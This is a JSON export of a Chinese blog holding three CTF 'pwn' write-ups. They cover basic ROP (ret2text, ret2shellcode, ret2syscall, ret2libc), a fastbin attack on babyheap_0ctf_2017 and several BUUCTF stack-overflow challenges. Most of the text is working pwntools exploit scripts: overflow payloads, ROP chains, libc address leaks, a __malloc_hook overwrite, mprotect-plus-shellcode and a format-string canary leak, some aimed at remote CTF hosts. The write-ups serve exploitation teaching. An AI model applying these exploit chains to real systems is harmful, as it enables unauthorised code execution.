{"pages":[],"posts":[{"title":"CTF-WIKI-pwn-基本ROP 漏洞复现","text":"基本ROP ret2text首先检查程序的保护机制。 关于各个保护机制的介绍 :https://www.cnblogs.com/Spider-spiders/p/8798628.html 看到只开启了NX保护，即不可在栈上执行代码。 使用IDA查看源码，可以看到这里有一个危险的gets函数 以及这里有一个system函数 所以如果能直接返回到0x804863A，即可执行该函数。 在GDB中对main函数里的gets函数下断点。 可以看到，存储局部变量 s(eax) 位于esp中存储 查看esp和ebp得知 s的地址为0xffffcecc ebp地址为0xffffcf38 两者距离108个字节 所以108+4=112即为返回地址的地址。( 因为没有开启canary，ebp上就是返回地址的值了。) python脚本，我会给出注释 12345from pwn import * sh = process('./ret2text') #本地链接到文件target = 0x804863a #执行system('/bin/sh')函数的地址sh.sendline('A' * 112 + p32(target)) # 112是上面计算出来的s距离返回地址的字节距离sh.interactive() #进行交互 ret2shellcode先检查程序的保护机制 全部关闭，并且通过RELRO 为Partial 部分模式，得知程序存在存在可读可写可执行段。 通过IDA观察得知，这次同样使用不安全的gets输入，并且将输入完的值拷贝至buf2，观察buf2是什么样的一块内存。 buf是一块位于bss段的可读可写可执行段。所以泄露思路为: 将shellcode拷贝至buf2里，然后通过堆栈溢出将函数返回到执行buf2即可。 在gets函数处下断点 得知s地址为0xffffcecc，ebp地址为0xffffcf38 ebp+4即为函数返回地址。 所以0xcf38-0xcecc+4即为s与返回地址之间的字节距离。 写python脚本 12345678910from pwn import *context.binary = 'ret2shellcode' #全局自动设置架构类型与os类型sh=process('./ret2shellcode') #本地连接target=0x804A080#buf2的地址shellcode=asm(shellcraft.sh())#产生以一个最简单的执行system('/bin/sh')的shellcode 并进行汇编print(p32(target))payload=shellcode.ljust(0xcf38-0xcecc+4,'A')+p32(target)sh.sendline(payload)sh.interactive() ret2syscall先检查开启了哪些防护措施 开启了NX保护，所以无法在栈上直接执行代码。 使用IDA查看，仍然是gets函数导致的栈溢出。 使用系统调用来完成漏洞利用。 找到pop eax,ret，以同样的方法找到ebx.ecx.edx 以及int 80h系统调用和bin/sh 接下来要了解payload这样构成的原因，需要知道这三个指令 在堆栈里，我们知道ebp+4的地方为返回地址。这是因为leave 时 esp=ebp+4,ret 将当前esp指向的值作为返回地址跳转并且ESP+4。 所以构造payload为 payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 先用112个A填充，pop_eax_ret为第一个返回地址，然后ESP指向0xb,以此类推。 写出python脚本，之前都解释过 不再注释了。 123456789101112131415from pwn import *sh = process('./rop')context.binary= 'rop'binsh = 0x80be409int_0x80 = 0x8049421pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc1给出got表 PLT表 以及libc的相关解释，我觉得写的很清楚 https://blog.csdn.net/Retrovich/article/details/82973086 基本流程仍然相似，先检查保护 只打开了NX 检查是否存在/bin/sh 在IDA中查找system函数 查看到ptl处的system函数 写Python脚本 12345678from pwn import *context.binary = 'ret2libc1'sh = process('./ret2libc1')binsh = 0x8049720system = 0x8048460payload = flat(['A'*112+system+'b'*4+binsh])&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;sh.sendline(payload)sh.interactive() ret2libc2这里仍然用相同的流程，唯一不同的是没有直接给出/bin/sh,需要先调用gets函数再利用pop ret调用system函数 直接给出python的脚本，与上一个例子相同，整体不再多赘述 1234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 我给出了堆栈溢出的ESP指向流程图，顺着思考容易看懂payload ret2libc3 检查安全保护，只开启了NX IDA里查看，仍然是gets函数的堆栈溢出。 但是这里没有给system函数 也没有给定的/bin/sh 所以需要我们从libc中调用system函数 根据这个知识点 写exp,涉及新的东西我仍然全部做注释 12345678910111213141516171819202122232425from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('ret2libc3') #静态加载ELF文件puts_plt = ret2libc3.plt['puts'] #获取指定文件的plt条目libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取指定文件的got条目main = ret2libc3.symbols['_start'] #获取指定文件的函数地址print(&quot;leak main_got addr and return main&quot;)payload = flat(['A'*112,puts_plt,main,libc_start_main_got]) #先使用plts_plt函数打印出main函数的在got表中的真实地址sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4]) #获取main函数的真实地址libc = LibcSearcher('__libc_start_main',libc_start_main_addr) #获取libclibcbase = libc_start_main_addr-libc.dump('__libc_start_main') #获取libc基地址system_addr = libcbase+libc.dump('system') #获取system地址binsh_addr = libcbase +libc.dump('str_bin_sh') #获取binsh字符串地址print(&quot;now get shell&quot;)payload = flat(['A'*112,system_addr,'A'*4,binsh_addr]) #这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.sh.send(payload)sh.interactive()","link":"/2021/11/11/ROP/"},{"title":"babyheap_0ctf_2017","text":"堆溢出 malloc_chunk的结构参考文章：https://blog.csdn.net/weixin_43847969/article/details/104897249 pre_size: 这个参数分两种情况，一种情况记录大小，一种情况记录数据当前一个chunk的状态是空闲时记录大小（也就是被free的时候），当前一个chunk的状态不是空闲的时候，记录它的数据。然后是 size： 就是这个chunk的大小,size的最后3个比特位对大小没有影响，但是要表示了一些东西分别是non_main_arena :记录当前chunk是否属于主线程is_mapped：当前chunk是否由mmap分配prev_inuse：记录前一个chunk是否被分配（这个最重要，因为我们当这个参数为0时，我们能够通过它获得上一个chunk的大小和地址） fd,bk: 表示用户数据，或者表示地址chunk非空闲时，fd和bk存在的地方表示的是用户的数据，chunk空闲时，fd存储下一个空闲的chunk，bk指向上一个空闲的chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被free的顺序，而不是地址上的相邻。 chunk的结构 第一个是size of previous（前一个chunk的大小，如果前一个chunk空闲的话）第二个size of chunk 当前chunk的大小，然后再末尾有3个比特位amp分别代表上面介绍过的3个参数第三个就是存储数据的部分然后就到了下一个chunk(next_chunk)，我们把这个next_chunk称为chunk2,上面的chunk称为chunk1，可以看到如果chunk1正在使用的话，那么chunk的头部位置，也就是prev_size，会被chunk1使用然后chunk2的第二行的后三个比特位也分别是A01，A代表着是否属于主线程（这里我们不知道所以用A代替），0代表着当前chunk不是由mmap分配，1代表着前一个chunk已经被分配。 chunk被free后结构变化： 第一行,没变化，因为它是chunk1第二行开始，M的位置变成了0，代表着chunk不是由mmap分配第三行开始，原本存储数据的部分变成了forward pointer to next chunk in list也就是fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被free了，那么就存储的是下一个空闲的chunk，下面的back pointer to previous chunk in list（bk）同理.然后就到了unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种bin中去。然后就到了chunk2,第一行记录当前chunk的大小，（并且不会被前一个chunk占用）第二行记录前一个chunk的大小，并且末尾三位变成了A00,（这时候如果这个是堆中第一个被分配的chunk的话我们能通过prev_size字段获取上一个chunk的大小以及地址。） chunk的空间复用： bin及分类 fast bins small binslarge binsunsorted bins未被分类，刚被free未真的进入bin Top Chunk babyheap_0ctf_2017考点： fastbin attack 利用思路两次 double free 与 fastbin attack 。第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。 利用过程1、通过unsortedbin attack 来泄露libc地址 首先应该记住这样一条规律：当small chunk被释放时，它的fd、bk指向一个指针，这个指针指向top chunk地址，这个指针保存在main_arena的0x58偏移处，而main_arena是libc的data段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出libc的基地址了，所以重点是当small chunk释放时，能读出fd 或者 bk的值 我首先通过如下重叠两个块来泄漏libc的地址（也是常见的攻击）。 payload: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *e = ELF('./libc-2.23.so')p = remote('node4.buuoj.cn',29370)# p = process('./babyheap')p.readuntil('Command:')context(log_level='debug')def alloc(a): p.writeline('1') p.readuntil('Size:') p.writeline(str(a)) #p.readuntil('Command:')def update(a,b,c): p.writeline('2') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Size:') p.writeline(str(b)) p.readuntil('Content:') p.write(c) p.readuntil('Command:')def dele(a): p.writeline('3') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Command:')def show(a): p.writeline('4') p.readuntil('Index:') p.writeline(str(a))alloc(0x18) #0alloc(0x18) #1alloc(0x68) #2alloc(0x68) #3update(0, 0x20, 'a'*0x18+p64(0x91)) #size1+size2dele(1) #1 #free1alloc(0x18) #alloc1show(2) #fd, bk at alloc2#gdb.attach(p)libcbase = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x3c4b78log.info(hex(libcbase))malloc_hook = libcbase + 0x3c4aedlog.info(hex(malloc_hook))one = libcbase + 0x4526adele(2) #free2#gdb.attach(p)update(1, 0x28, 'a'*0x18+p64(0x71)+p64(malloc_hook)) #fd at 2-&gt;malloc_hook#gdb.attach(p)alloc(0x68) #2#gdb.attach(p)alloc(0x68) #4 at malloc_hook#gdb.attach(p)update(4, 0x1b, p8(2)*3+p64(2)*2+p64(one))#gdb.attach(p)alloc(255) p.interactive()","link":"/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"title":"","text":"title: 栈溢出category: pwn stack，BUUCTF 一. 基础知识补充 指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP(Instruction Pointer)分别为64位、32位、16位指令指针寄存器 以64位程序为例: 在执行call指令的时候，会向栈中压入call指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行 push rbp ;将父函数栈底压入栈中mov rbp, rsp ;将父函数栈顶变为子函数栈底sub rsp, 0x70 ;向低地址处为子函数开辟栈帧 在函数调用结束的时候，程序会执行这两条指令leave指令相当于执行了如下两条指令mov esp ebppop ebp ret指令则可以理解为将栈中的返回地址pop给rip的操作，从而回到父函数继续执行 二. ret2text栈溢出函数：strcpy 程序本身存在fflush函数，我们可以直接用它的sh来当作system的参数 三. ret2libc泄露libc利用思路： 利用write函数来泄露程序的libc版本 知道libc版本后去计算程序里的system函数和字符串“/bin/sh”的地址 覆盖返回地址为system（‘/bin/sh’），获取shell 例题：2018_rop 1: 12345payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4)) # 获取write函数地址libc=LibcSearcher('write',write_addr) 首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位。 2: 1234offset=write_addr-libc.dump('write') #计算偏移量 #偏移量=程序里的函数地址-libc里的函数地址system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh') 3: 构造rop获取shell 1payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh) 完整exp: 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *r=remote('node3.buuoj.cn',27043)elf=ELF('./2018_rop')write_plt=elf.plt['write']write_got=elf.got['write']main=elf.sym['main']payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4))libc=LibcSearcher('write',write_addr)offset=write_addr-libc.dump('write')system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh')payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)r.sendline(payload)r.interactive() 但是我在这么写的时候出现了 timeout: the monitored command dumped core,尝试泄露read函数的真实地址，再调用read函数来找到偏移。(后来找到问题有：payload的顺序错误也会导致timeout和找不到libc,timeout对应payload:填充+got表+plt表+main，找不到libc对应payload:填充+pop_rdi_ret+binsh_system,对应64位栈溢出，32位和64位不同) 64位查找pop_rdi: 1ROPgadget --binary bjdctf_2020_babyrop |grep &quot;pop rdi&quot; exp: 1234567891011121314151617181920212223from pwn import *from LibcSearcher import *elf = ELF(&quot;./2018_rop&quot;)p = remote(&quot;node3.buuoj.cn&quot;,28628)read_plt = elf.plt['read']read_got = elf.got['read']write_plt = elf.plt['write']main_addr = 0x080484C6payload = 'a' * (0x88 + 0x4) payload += p32(write_plt) + p32(main_addr)payload += p32(1) + p32(read_got) + p32(8)p.sendline(payload)read_addr = u32(p.recv(4))print hex(read_addr)libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = 'a' * (0x88 + 0x4)payload += p32(sys_addr) + p32(0) + p32(binsh)p.sendline(payload)p.interactive() LibcSearcher使用方法：将exp放在libcsearcher的安装目录下 12345678910111213141516171819202122232425# coding:utf-8from pwn import*from LibcSearcher import*p=remote('node3.buuoj.cn','25295')elf=ELF('./1')main=0x400b28rdi=0x400c83ret=0x4006b9pus_plt=elf.plt['puts']puts_got=elf.got['puts']p.sendlineafter('Input your choice!\\n','1')payload='\\0'+'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter('Input your Plaintext to be encrypted\\n',payload)p.recvline()p.recvline() #接收 encrypt 的两个 puts函数输出;puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\0')) #得到 puts 函数 的地址;libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到偏移地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址p.sendlineafter('choice!\\n','1') # 再一次执行 一遍流程payload='\\0'+'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)p.sendlineafter('encrypted\\n',payload)p.interactive() plt表-》got表 四. 利用mprotect修改内存权限mprotect函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。 ROPgadget使用例题：not_the_same_3dsctf_2016 利用mprotect函数修改bss段为0x7即0b111，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置 1ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop 需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8 ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr=0x80eb000 将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入shellcode 12345678910111213141516171819202122232425# mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行int mprotect(const void *start, size_t len, int prot);argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)elf = ELF('./pwn')# ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep poppop3_addr = 0x0806fcc8 # pop esi ; pop ebx ; pop edx ; retpayload = 0x2D * 'a' + 0x4 * 'b' + p32(elf.symbols['mprotect'])payload += p32(pop3_addr) # 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个poppayload += p32(argu1) + p32(argu2) + p32(argu3)# 紧接着返回地址为 read对修改的目标地址写入shellcodepayload += p32(elf.symbols['read']) payload += p32(pop3_addr) # 同样栈还原，为了执行紧接着的 目标地址payload += p32(0) + p32(argu1) + p32(0x100)# read写完后 写入执行的目标地址payload += p32(argu1)# 先进行sendline执行到read等待输入sh.sendline(payload)# 继续sendline发送shellcodesh.sendline(asm(shellcraft.sh(), arch = 'i386', os = 'linux'))# 进入交互模式sh.interactive() 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#coding:utf-8from pwn import*context.log_level = 'debug'context(arch='i386', os='linux')local = 0proc_name = './not_the_same_3dsctf_2016'elf = ELF(proc_name)# 这道题本地和远程两种解法，真的干。。。if local: sh = process(proc_name) str_flag_addr = 0x080ECA2D backdoor_addr = 0x080489A0 printf_addr = 0x0804F0A0 payload = 0x2D * 'a' # 这边不用覆盖ebp,在于get_flag并没有push ebp payload += p32(backdoor_addr) + p32(printf_addr) payload += p32(str_flag_addr) sh.sendline(payload)else: sh = remote('node3.buuoj.cn', 28308) mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] pop3_edi_esi_ebx_ret = 0x0806fcc8 mem_addr = 0x080EB000 #.got.plt 的起始地址 mem_size = 0x1000 mem_type = 0x7 # 可执行权限 payload = 0x2D * 'a' payload += p32(mprotect_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(mem_addr) + p32(mem_size) + p32(mem_type) payload += p32(read_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(0) + p32(mem_addr) + p32(0x100) payload += p32(mem_addr) #将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode sh.sendline(payload) # read写入shellcode payload = asm(shellcraft.sh()) sh.sendline(payload)sh.interactive() 五. 32位，64位栈溢出对比32位的函数在调用栈的时候是： 调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1 由于在函数调用前通过push指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过add esp 0x10这条指令，即增加esp来恢复函数调用前的esp。 64位的函数在调用栈的时候是： 前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。 参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址 六. 覆盖相关变量关键变量 ebp ret_addr 虚函数指针 ​ 子类对父类的继承​ 能够对函数进行重写​ 由虚函数表来进行操作 SEH链 ​ SEH结构 结构 在栈中存在的 地方 ，在 在ret_addr和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对SEH链的攻击 Hook中的变量 利用方法介绍 有些系统函数有预先定义好的钩子 修改钩子链表中存储的子程序指针影响钩子运行 fgets的用法的时候，发现它能够避免造成溢出 程序自带的system函数地址 timeout: the monitored command dumped core解决 1)在payload后面加几个ret地址，或者加一个假的0xdeadbeef 1p = flat(['a'*0x10, 'b'*8, pop_di, bin_sh_addr, system, 0xdeadbeef]) 2)直接用系统函数的地址 七. BUUCTF 例题1. JarvisOJ level4知识点参考文章：借助DynELF实现无libc的漏洞利用小结 pwntools中DynELF函数使用(针对未给出libc文件) 123456789def leak(address): payload=pad+p32(writeplt)+ret1+p32(1)+p32(address)+p32(4) io.sendline(payload) leak_sysaddr=io.recv(4) #print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or '').encode('hex')) 这里是测试用，可省略。 return leak_sysaddrd = DynELF(leak, elf=ELF(&quot;对应文件&quot;))sysaddr=d.lookup(&quot;system&quot;,&quot;libc&quot;) pad为填充，ret1为有效的返回地址 WP 开了NX保护（堆栈不可执行） 利用DynELF泄露system地址，通过read函数写入/bin/sh到bss段 exp: 123456789101112131415161718192021222324from pwn import *conn=process('./level4')e=ELF('./level4')pad=0x88write_plt=e.plt['write']vul_addr=0x804844bbss_addr=0x0804a024def leak(address): payload1='a'*0x8c+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4) conn.sendline(payload1) data=conn.recv(4) return data d=DynELF(leak,elf=e)system_addr=d.lookup('system','libc')print hex(system_addr)read_plt=e.plt['read']payload2='a'*0x8c+p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)conn.sendline(payload2)conn.send(&quot;/bin/sh&quot;)payload3=&quot;a&quot;*0x8c+p32(system_addr)+p32(0xdeadbeef)+p32(bss_addr)conn.sendline(payload3)conn.interactive() 常规解法: 123456789101112131415161718192021222324252627282930#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 25934)elf = ELF(&quot;./level4&quot;)read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; * 0x8c + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendline(payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * 0x8c + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendline(payload)p.interactive() jarvisoj_level3_x6464位ret2libc（no canary found) checksec 泄露libc 64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。我们这边要利用write函数去泄露libc版本write函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参 123456ssize_t write(int fd,const void*buf,size_t count);参数说明： fd:是文件描述符（write所对应的是写，即就是1） buf:通常是一个字符串，需要写入的字符串 count：是每次写入的字节数 利用ROPgadget寻找rdi,rsi寄存器地址 WP: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *r=remote('node4.buuoj.cn',26919)# r = process('./level3_x64')context(os = &quot;linux&quot;, arch = &quot;amd64&quot;, log_level= &quot;debug&quot;)elf=ELF('./level3_x64')#libc=ELF('./libc-2.19.so')write_plt=elf.plt['write']write_got=elf.got['write']main=0x40061Ardi=0x4006b3rsi_r15=0x4006b1payload='a'*(0x80+8)+p64(rdi)+p64(1) #rdi寄存器设置write函数的第一个参数为‘1’payload+=p64(rsi_r15)+p64(write_got)+p64(8) #rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8payload+=p64(write_plt) #去调用write函数payload+=p64(main) #控制程序流，回到main函数，继续控制r.sendlineafter('Input:',payload)write_addr=u64(r.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))#write_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0'))print hex(write_addr)libc=LibcSearcher('write',write_addr)libc_base=write_addr-libc.dump('write')system_addr=libc_base+libc.dump('system')binsh=libc_base+libc.dump('str_bin_sh')payload='a'*(0x80+8)+p64(rdi)+p64(binsh)+p64(system_addr)r.sendlineafter('Input:',payload)r.interactive() bjdctf_2020_babyrop2 程序结构 init（） gift（） vuln（） 在gift函数处存在格式化字符串漏洞，可以用来泄露libc 在vuln函数处存在buf溢出漏洞，绕过canary就可以利用ret2libc来获取shell 泄露canary值 输入%n$p来找偏移，n为偏移量，$p定位到偏移处，%p以16进制输出 找到一个nop指令下断点查看栈的情况 可以看到6161下面有一串16进制数，这个就是canary值，利用%7$p就可以泄露它的值，而且看到它在栈的位置是0x18 泄露canary: 1234payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16) 另外pwngbd提供了一种方便的函数fmtarg，使用格式为fmtarg addr。在进入printf函数时断下，调用fmtarg后可以自动计算格式化参数与addr的偏移。fmtarg在计算index时将RDI也算了进去，后面会自动减一作为%$p的参数： 利用puts函数泄露libc，puts函数只有一个参数，64位传参，利用rdi寄存器即可，ROPgadget找rdi exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *from LibcSearcher import *# p = process('./bjdctf_2020_babyrop2')p = remote('node4.buuoj.cn',25998)elf = ELF('./bjdctf_2020_babyrop2')context.log_level = 'debug'payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16)print str(canary)puts_plt = elf.plt['puts']puts_got = elf.got['puts']pop_rdi = 0x400993main_addr = elf.sym['main']vul_addr = 0x400887payload = 'a'*0x18+p64(canary)payload += p64(0)payload +=p64(pop_rdi)payload +=p64(puts_got)payload +=p64(puts_plt)+p64(vul_addr)p.recvuntil('story!\\n')p.sendline(payload)puts_addr = u64(p.recv(6).ljust(8,'\\x00'))print hex(puts_addr)libc = LibcSearcher('puts',puts_addr)base = puts_addr-libc.dump('puts')sys_addr = base+libc.dump('system')binsh = base+libc.dump('str_bin_sh')p.recvuntil('story!\\n')payload ='a'*0x18+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)payload +=p64(main_addr)p.sendline(payload)p.interactive()","link":"/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"}],"tags":[],"categories":[{"name":"pwn","slug":"pwn","link":"/categories/pwn/"}]}